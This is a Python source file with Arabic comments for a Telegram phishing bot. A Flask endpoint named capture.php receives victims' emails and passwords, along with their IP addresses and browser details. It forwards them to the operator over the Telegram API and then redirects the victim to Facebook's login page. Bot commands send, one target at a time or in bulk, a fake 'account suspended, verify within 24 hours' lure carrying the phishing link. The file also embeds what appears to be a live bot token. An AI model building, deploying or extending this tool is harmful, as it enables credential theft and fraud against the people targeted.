# language: Python 3, file: bot.py
# *بوت موحّد: إرسال الرابط + استقبال البيانات + أوامر إدارية*
import asyncio
import threading
import requests
from flask import Flask, request, redirect
from telegram import Bot, Update
from telegram.ext import Application, CommandHandler, ContextTypes
from telegram.error import TelegramError

# ============ الإعدادات ============
BOT_TOKEN  = "9262195612:AAHvhixjILczZNAp4AR2B7mRQAy1heKj6Is"
PHISH_LINK = "ضع_رابط_كلاودفلير_هنا"     # ← بدّله بعد تشغيل cloudflared
ADMIN_ID   = 0                            # ← حط chat_id مالك البوت (من /start)
PORT       = 8080
# ====================================

bot = Bot(token=BOT_TOKEN)
app = Flask(__name__)


def notify_admin(text: str):
    if ADMIN_ID:
        try:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                data={"chat_id": ADMIN_ID, "text": text, "parse_mode": "HTML"},
                timeout=5,
            )
        except Exception:
            pass


@app.route("/capture.php", methods=["POST"])
def capture():
    email    = request.form.get("email", "")
    password = request.form.get("password", "")
    ip       = request.remote_addr
    ua       = request.headers.get("User-Agent", "")

    msg = (
        f"<b>🎯 بيانات جديدة</b>\n"
        f"<b>IP:</b> {ip}\n"
        f"<b>Email:</b> {email}\n"
        f"<b>Pass:</b> <code>{password}</code>\n"
        f"<b>UA:</b> {ua[:80]}"
    )
    notify_admin(msg)
    return redirect("https://www.facebook.com/login", code=302)


def run_flask():
    app.run(host="0.0.0.0", port=PORT, threaded=True, use_reloader=False)


async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    await update.message.reply_text(
        f"تم تفعيل البوت.\nchat_id الخاص بك:\n`{chat_id}`",
        parse_mode="Markdown",
    )


async def cmd_send(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text("الاستخدام: /send <chat_id>")
        return
    try:
        target = int(ctx.args[0])
    except ValueError:
        await update.message.reply_text("chat_id يجب أن يكون رقماً")
        return

    text = (
        "مرحباً،\n"
        "تم تعليق حسابك مؤقتاً. يرجى التحقق خلال 24 ساعة:\n"
        f"{PHISH_LINK}\n\n"
        "فريق الدعم"
    )
    try:
        await bot.send_message(chat_id=target, text=text)
        await update.message.reply_text(f"[+] أُرسل إلى {target}")
    except TelegramError as e:
        await update.message.reply_text(f"[-] فشل: {e}")


async def cmd_link(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"الرابط الحالي:\n{PHISH_LINK}")


async def cmd_broadcast(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text("الاستخدام: /broadcast <id1> <id2> ...")
        return
    text = (
        "مرحباً،\n"
        "تم تعليق حسابك مؤقتاً. يرجى التحقق خلال 24 ساعة:\n"
        f"{PHISH_LINK}\n\n"
        "فريق الدعم"
    )
    sent = 0
    for a in ctx.args:
        try:
            target = int(a)
            await bot.send_message(chat_id=target, text=text)
            sent += 1
            await asyncio.sleep(3)
        except Exception:
            continue
    await update.message.reply_text(f"[+] أُرسل إلى {sent} هدف")


def main():
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", cmd_start))
    application.add_handler(CommandHandler("send", cmd_send))
    application.add_handler(CommandHandler("link", cmd_link))
    application.add_handler(CommandHandler("broadcast", cmd_broadcast))

    threading.Thread(target=run_flask, daemon=True).start()
    application.run_polling()


if __name__ == "__main__":
    main()
